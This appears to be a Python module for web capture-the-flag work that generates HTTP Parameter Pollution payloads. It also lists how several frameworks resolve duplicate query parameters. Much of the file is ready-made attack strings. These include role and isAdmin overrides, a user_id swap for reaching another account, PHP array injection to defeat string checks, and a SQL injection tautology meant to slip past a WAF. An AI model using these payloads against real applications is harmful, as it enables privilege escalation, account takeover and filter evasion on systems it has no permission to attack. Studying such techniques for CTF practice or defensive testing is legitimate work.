"""
HTTP Parameter Pollution (HPP) Payload Crafter for Web CTF.
Covers duplicate parameter injection, array-based pollution, and framework-specific behaviors.
"""

from typing import List, Dict


def get_hpp_payloads(param: str = "role", value: str = "admin") -> List[Dict[str, str]]:
    """Generate HTTP Parameter Pollution payloads for various frameworks."""
    return [
        {
            "name": "Duplicate Parameter (Same Name)",
            "payload": f"{param}=user&{param}={value}",
            "desc": "Sends same parameter twice; server behavior varies by framework."
        },
        {
            "name": "Duplicate Parameter (Reversed Order)",
            "payload": f"{param}={value}&{param}=user",
            "desc": "Reversed order to test which value the server takes."
        },
        {
            "name": "Array Notation (PHP)",
            "payload": f"{param}[]={value}",
            "desc": "PHP treats param[] as array, bypassing string comparisons."
        },
        {
            "name": "Array Notation with Multiple Values",
            "payload": f"{param}[]=user&{param}[]={value}",
            "desc": "Multiple array values for PHP type juggling."
        },
        {
            "name": "Semicolon Separator",
            "payload": f"{param}=user;{param}={value}",
            "desc": "Semicolon separator (some parsers split on ;)."
        },
        {
            "name": "Comma Separator",
            "payload": f"{param}=user,{value}",
            "desc": "Comma separator (some frameworks join with comma)."
        },
        {
            "name": "Encoded Separator",
            "payload": f"{param}=user%26{param}={value}",
            "desc": "URL-encoded ampersand to bypass naive splitting."
        },
        {
            "name": "Plus Sign Separator",
            "payload": f"{param}=user+{value}",
            "desc": "Plus sign as separator (space in URL encoding)."
        },
        {
            "name": "Nested Parameter (Dots)",
            "payload": f"{param}.x=user&{param}.y={value}",
            "desc": "Dot notation for nested objects (some frameworks)."
        },
        {
            "name": "Nested Parameter (Brackets)",
            "payload": f"{param}[x]=user&{param}[y]={value}",
            "desc": "Bracket notation for nested objects."
        },
        {
            "name": "Case Variation Duplicate",
            "payload": f"{param}=user&{param.upper()}={value}",
            "desc": "Case-insensitive parameter names may be treated as same."
        },
        {
            "name": "Whitespace in Parameter Name",
            "payload": f"{param}=user&{param} ={value}",
            "desc": "Trailing space in parameter name bypasses exact matching."
        }
    ]


def get_hpp_framework_behavior() -> List[Dict[str, str]]:
    """Document how different frameworks handle duplicate parameters."""
    return [
        {
            "framework": "PHP / Apache",
            "behavior": "Last value wins",
            "desc": "PHP takes the last occurrence of a duplicate parameter."
        },
        {
            "framework": "ASP.NET / IIS",
            "behavior": "Comma-joined",
            "desc": "ASP.NET joins duplicate values with a comma (user,admin)."
        },
        {
            "framework": "Node.js / Express (qs)",
            "behavior": "Array",
            "desc": "Express with qs parses duplicates into an array."
        },
        {
            "framework": "Python / Flask",
            "behavior": "First value wins",
            "desc": "Flask request.args.get() returns the first value."
        },
        {
            "framework": "Java / Tomcat",
            "behavior": "First value wins",
            "desc": "Tomcat getParameter() returns the first value."
        },
        {
            "framework": "Ruby / Rails",
            "behavior": "Last value wins",
            "desc": "Rails params returns the last value."
        },
        {
            "framework": "Go / net/http",
            "behavior": "First value wins",
            "desc": "Go r.URL.Query().Get() returns the first value."
        }
    ]


def get_hpp_auth_bypass_payloads() -> List[Dict[str, str]]:
    """HPP payloads specifically for authentication / authorization bypass."""
    return [
        {
            "name": "Admin Role Override",
            "payload": "role=user&role=admin",
            "desc": "Backend may use last value (admin) while WAF sees first (user)."
        },
        {
            "name": "Admin Role Array",
            "payload": "role[]=user&role[]=admin",
            "desc": "PHP array injection to bypass strcmp/role checks."
        },
        {
            "name": "User ID Override",
            "payload": "user_id=1&user_id=1337",
            "desc": "Duplicate user_id to access another account."
        },
        {
            "name": "isAdmin Boolean Override",
            "payload": "isAdmin=false&isAdmin=true",
            "desc": "Duplicate boolean flag to escalate privileges."
        },
        {
            "name": "SQL Injection via HPP",
            "payload": "id=1&id=1' OR '1'='1",
            "desc": "WAF checks first (safe) value, backend uses second (injected)."
        }
    ]
